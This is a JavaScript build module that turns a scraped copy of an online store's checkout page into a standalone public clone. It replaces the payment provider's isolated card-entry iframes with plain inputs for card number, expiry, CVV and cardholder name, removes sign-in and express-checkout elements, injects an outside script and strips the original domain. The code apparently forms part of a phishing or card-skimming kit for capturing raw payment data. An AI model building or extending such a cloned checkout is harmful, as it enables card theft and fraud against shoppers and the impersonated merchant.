/**
 * Shared checkout HTML transforms (scrape → public/checkout).
 */
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import * as cheerio from 'cheerio';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
export const ROOT = path.join(__dirname, '..');
export const SCRAPE = path.join(ROOT, 'scrape', '20260611204543362', 'index.html');
export const OUT = path.join(ROOT, 'public', 'checkout', 'index.html');
export const FIELDS_JS = path.join(ROOT, 'public', 'checkout', 'checkout-fields.js');
export const FIX_CSS = path.join(ROOT, 'public', 'checkout', 'checkout-fix.css');
export const CUSTOM_FIELDS = path.join(ROOT, 'custom', 'checkout', 'checkout-fields.js');

export const INPUT_CLASS =
  '_7ozb2ur _7ozb2uq _1fragemtb _1fragemwg _1fragemz5 _1fragem100 _1fragemzh _7ozb2uw _7ozb2uv _1fragemzp _1fragemzk _1fragemzz _7ozb2u16 _7ozb2u1b _7ozb2u1u _7ozb2us';

export const CARD_FIELDS = [
  { hostId: 'number', inputId: 'card-number', labelId: 'number-label', autocomplete: 'cc-number', inputmode: 'numeric' },
  { hostId: 'expiry', inputId: 'card-expiry', labelId: 'expiry-label', autocomplete: 'cc-exp', inputmode: 'numeric' },
  { hostId: 'verification_value', inputId: 'card-cvv', labelId: 'verification_value-label', autocomplete: 'cc-csc', inputmode: 'numeric' },
  { hostId: 'name', inputId: 'card-name', labelId: 'name-label', autocomplete: 'cc-name' },
];

export function loadScrape() {
  if (!fs.existsSync(SCRAPE)) throw new Error(`Scrape not found: ${SCRAPE}`);
  const raw = fs.readFileSync(SCRAPE, 'utf8');
  return cheerio.load(raw, { decodeEntities: false });
}

export function replaceCardIframes($) {
  for (const f of CARD_FIELDS) {
    const $host = $(`#${f.hostId}`).first();
    if (!$host.length) continue;

    const $label = $(`label#${f.labelId}, label[for="${f.hostId}"]`).first();
    if ($label.length) $label.attr('for', f.inputId);

    $host.removeAttr('tabindex data-card-fields data-card-field-placeholder data-card-field-prefix');
    $host.removeClass('_211UF');

    const attrs = [
      `id="${f.inputId}"`,
      `class="${INPUT_CLASS}"`,
      `autocomplete="${f.autocomplete}"`,
      'value=""',
      `aria-labelledby="${f.labelId}"`,
    ];
    if (f.inputmode) attrs.push(`inputmode="${f.inputmode}"`);

    $host.empty().append(`<input ${attrs.join(' ')}>`);
  }

  for (const extraId of ['issue_date', 'issue_number']) {
    const $host = $(`#${extraId}`).first();
    if ($host.length) $host.closest('.Uq6Ln').remove();
  }

  $('iframe.card-fields-iframe').remove();
}

export function removeCheckoutBlocks($) {
  $('section[aria-label="Quick Checkout"]').remove();
  $('#gift-card-field').remove();
  $('#3p-gift-card-field').remove();

  $('a[href*="customer_authentication/login"]').remove();
  $('a').each((_, el) => {
    if ($(el).text().trim() === 'Sign in') $(el).remove();
  });

  $('#basic-SHOPIFY_INSTALLMENTS').closest('._1u2aa6m3').remove();

  $('#billingAddressDetails').remove();
  $('#billingAddressCheckbox').closest('._1mmswk95').remove();
  $('#billingAddressCheckbox').remove();
  $('label[for="billingAddressCheckbox"]').remove();

  $('div[aria-label="Remember me"]').remove();
  $('shop-checkout-modal').remove();

  $('.sBuoU button').each((_, el) => {
    if ($(el).text().trim() === 'Not now') $(el).closest('.sBuoU').remove();
  });
}

export function syncAssetFiles() {
  fs.mkdirSync(path.dirname(FIELDS_JS), { recursive: true });
  if (fs.existsSync(CUSTOM_FIELDS)) {
    fs.copyFileSync(CUSTOM_FIELDS, FIELDS_JS);
  }

  const fixCss = `/* Card fields: native inputs inside former iframe hosts */
.DCpNs input,
.KAqU2 input {
  width: 100%;
  height: 47px;
  box-sizing: border-box;
  border: none;
  background: transparent;
  outline: none;
  font: inherit;
  color: inherit;
  padding: 0;
  margin: 0;
}

iframe.card-fields-iframe {
  display: none !important;
}
`;
  fs.writeFileSync(FIX_CSS, fixCss, 'utf8');
}

export function injectAssets($) {
  if (!$('link[href="/checkout/checkout-fix.css"]').length) {
    $('head').append('<link rel="stylesheet" href="/checkout/checkout-fix.css">');
  }
  if (!$('script[src="/checkout/checkout-fields.js"]').length) {
    $('body').append('<script src="/checkout/checkout-fields.js"><\/script>');
  }
}

export function writeCheckout($) {
  injectAssets($);
  let html = $.html();
  html = html.replace(/https:\/\/shop-titancore\.com/g, '');
  fs.writeFileSync(OUT, html, 'utf8');
  return html;
}
